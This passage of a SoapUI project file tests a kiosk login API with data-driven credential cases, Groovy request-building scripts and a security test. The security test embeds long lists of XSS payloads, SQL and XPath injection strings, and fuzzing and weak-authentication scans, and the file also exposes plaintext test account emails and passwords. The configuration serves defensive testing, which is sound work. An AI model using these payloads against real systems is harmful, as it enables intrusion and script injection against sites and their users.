xmlns:con="http://eviware.com/soapui/config">true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config"/></xml-fragment>]]></row><row><![CDATA[<xml-fragment><con:entry xmlns:con="http://eviware.com/soapui/config">Valid Login and Invalid Password</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">rental.automation@gmail.com</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">redbox123</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">1505</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">false</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config"/></xml-fragment>]]></row><row><![CDATA[<xml-fragment><con:entry xmlns:con="http://eviware.com/soapui/config">Invalid Login and Valid Password</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">123abx@gma.com</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">Testing1!</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">1505</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">false</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config"/></xml-fragment>]]></row><recognizeAsPlainText>true</recognizeAsPlainText></con:configuration></con:dataSource><con:property>Scenario</con:property><con:property>LoginEmailAddress</con:property><con:property>Password</con:property><con:property>KioskID</con:property><con:property>ExpectedResponse</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Encode Message Body (KioskLogin)" id="1ed881e7-3d5d-422e-9870-3728898d7c40"><con:settings/><con:config><script>import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
def Scenario = context.expand( '${DataSource#Scenario}' );
log.info("--------------------------------------------------------------");
log.info("Scenario: $Scenario");
log.info("--------------------------------------------------------------");

def password = context.expand( '${DataSource#Password}' );
def EncryptedPassword = "c:\\Temp\\EncryptPassword.exe $password".execute().text.replaceAll("\\s","");

requestPayload = "";
def LoginEmailAddress = context.expand( '${DataSource#LoginEmailAddress}' );
def KioskID = context.expand( '${DataSource#KioskID}' );
def MessageId = UUID.randomUUID().toString();
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"KioskId\": $KioskID,";
requestPayload += "\"EngineVersion\": \"1.15.0.6\",";
requestPayload += "\"BundleVersion\": \"2.2.2.82\",";
requestPayload += "\"EmailAddress\": \"$LoginEmailAddress\",";
//requestPayload += "\"EmailAddress\": \"\",";
requestPayload += "\"Password\": \"$EncryptedPassword\",";
//requestPayload += "\"Password\": \"\",";
requestPayload += "\"IsOffline\": false,";
requestPayload += "\"MessageType\": \"KioskLogin\"";
requestPayload += "}";


// log to soapui log
log.info("KioskOnlinePayload: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)
testRunner.testCase.setPropertyValue("KioskLoginGUID",MessageId.toString()); //For MessageControl Validations</script></con:config></con:testStep><con:testStep type="httprequest" name="KioskLogin (Request)" id="e23a9485-16e3-4d89-9493-1146360b8efb"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="2f827cec-96de-4b99-b2fc-4153a6dfe7c0" name="KioskLogin (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" id="d00fe26d-b144-4dd6-8364-96f44b303ec1" name="Script Assertion"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("KioskLoginResponse: $response")
def expectedStatus = context.expand( '${DataSource#ExpectedResponse}' )
assert response.contains("\"Success\":$expectedStatus,")
//assert response.contains("\"HasErrors\":false,")
</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="5c484433-53d0-435e-88d1-f1a8fae7442f"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Encode Message Body (KioskLogin)</targetStep></con:config></con:testStep><con:properties><con:property><con:name>Password</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">Testing1!</con:value></con:property><con:property><con:name>LoginEmailAddress</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">rental.loyalty@gmail.com</con:value></con:property><con:property><con:name>KioskID</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">1505</con:value></con:property><con:property><con:name>EncryptedPassword</con:name><con:value>eoTcpOsJ7ssr54ynfDbowQ==</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageId%22%3A+%224df02d0a-f027-41c1-af49-d82b56f5a853%22%2C%22KioskId%22%3A+1505%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22EmailAddress%22%3A+%22123abx%40gma.com%22%2C%22Password%22%3A+%22eoTcpOsJ7ssr54ynfDbowQ%3D%3D%22%2C%22IsOffline%22%3A+false%2C%22MessageType%22%3A+%22KioskLogin%22%7D</con:value></con:property><con:property><con:name>KioskLoginGUID</con:name><con:value>4df02d0a-f027-41c1-af49-d82b56f5a853</con:value></con:property></con:properties><con:reportParameters/><con:securityTest id="71865b42-8c30-48de-bdb8-95605df03e8d" testCaseId="5095f806-2bfb-4d1d-b805-2c8f0e334b00" name="SecurityTest 2" failSecurityTestOnScanErrors="false" skipDataSourceLoops="true"><con:settings/><con:testStepSecurityTest><con:testStepId>e23a9485-16e3-4d89-9493-1146360b8efb</con:testStepId><con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="39e3a586-fdbc-4786-89c6-39fbe5f0931f" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings><con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings><con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings><con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings><con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings><con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings></con:config><con:assertion type="Sensitive Information Exposure" id="be84a65a-93a2-45cc-b0bc-8a04c5eaf34f" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:assertion type="CrosSiteScript" id="d2d59c4a-a745-40f3-95bd-c8ba080fc156" name="Cross Site Scripting Detection"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="513f6bd5-7c2d-4b2e-8212-a73e49964b82" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:minimal>5</con:minimal><con:maximal>15</con:maximal><con:numberOfRequest>100</con:numberOfRequest></con:config><con:assertion type="Sensitive Information Exposure" id="898e5557-4bf5-4f6a-ae6c-c7d9fe8eaf9c" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ALL_AT_ONCE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="3ccd6f9b-8e6c-4834-8a43-b6613a06242d" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings><con:sqlInjectionStrings>'--</con:sqlInjectionStrings><con:sqlInjectionStrings>1'</con:sqlInjectionStrings><con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings><con:sqlInjectionStrings>1/0</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings><con:sqlInjectionStrings>;</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings><con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings><con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings></con:config><con:assertion type="Sensitive Information Exposure" id="041ddcf4-96a5-4171-ad3d-4305bb601c68" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="XPathInjectionSecurityScan" name="XPath Injection" id="07029a5d-e170-4a77-b22a-8d23b57d38a3" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:XPathInjection" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:xpathList> or name(//users/LoginID[1]) = 'LoginID' or 'a'='b</con:xpathList><con:xpathList>' or '1'='1</con:xpathList><con:xpathList>1/0</con:xpathList><con:xpathList>'%20o/**/r%201/0%20--</con:xpathList><con:xpathList>' o/**/r 1/0 --</con:xpathList><con:xpathList>;</con:xpathList><con:xpathList>'%20and%201=2%20--</con:xpathList><con:xpathList>' and 1=2 --</con:xpathList><con:xpathList>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:xpathList><con:xpathList>test� UNION select 1, @@version, 1, 1;�</con:xpathList></con:config><con:assertion type="Sensitive Information Exposure" id="d5e08751-0232-49f5-a086-7c61439b6efc" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="18694352-04ae-4f75-8969-cdd8098fca4e" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:HttpMethodFuzzingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:deselectedMethods/></con:config><con:assertion type="Sensitive Information Exposure" id="cc9d1aac-7fa7-46df-b7a3-72d73c12cb6f" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:assertion type="Valid HTTP Status Codes" id="464aa328-6112-4d45-868f-fcd2938e9e88" name="Valid HTTP Status Codes"><con:settings><con:setting id="__LEVEL_">WARNING</con:setting></con:settings><con:configuration><codes>501,405,403</codes></con:configuration></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan><con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="99eef70b-b02e-4319-9eca-71c702985115" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:assertion type="WeakPassword" id="d512b338-79ad-4eb3-8d0b-fdac7326d636" name="Weak Password Detection"><con:configuration/></con:assertion><con:assertion type="BasicAuth" id="3c01e2cd-953a-470d-80e7-7b038e3f2338" name="Basic Authentication Detection"/><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan></con:testStepSecurityTest><con:properties/><con:reportParameters/></con:securityTest><con:breakPoints><con:testStepId>d2cbdf1b-7e5f-4b60-bfc6-9250e93c4e8d</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>5c484433-53d0-435e-88d1-f1a8fae7442f</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="49823818-8ceb-41ad-9e38-6be4af5de343" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="KioskLogin(Phone)" searchProperties="true" timeout="0" maxResults="0"><con:settings/><con:testStep type="groovy" name="LoginInfo" id="14235d12-bc87-4923-a8e1-a0383b866998"><con:settings/><con:config><script>def pin = context.expand( '${#TestCase#Pin}' );
def EncryptedPin = "c:\\Temp\\EncryptPassword.exe $pin".execute().text.replaceAll("\\s","");
//log.info ("[$encryptPassword]"); 
testRunner.testCase.setPropertyValue("EncryptedPin",EncryptedPin);</script></con:config></con:testStep><con:testStep type="groovy" name="Encode Message Body (KioskLogin)" id="e3f32af7-315e-4668-aec1-2bea6b7f05df"><con:settings/><con:config><script>import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;

requestPayload = "";
def EncryptedPin = context.expand( '${#TestCase#EncryptedPin}' );
def MobilePhoneNumber = context.expand( '${#TestCase#MobilePhoneNumber}' );
def KioskID = context.expand( '${#TestCase#KioskID}' );
def MessageId = UUID.randomUUID().toString();
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"KioskId\": $KioskID,";
requestPayload += "\"EngineVersion\": \"1.15.0.6\",";
requestPayload += "\"BundleVersion\": \"2.2.2.82\",";
requestPayload += "\"PhoneNumber\": \"$MobilePhoneNumber\",";
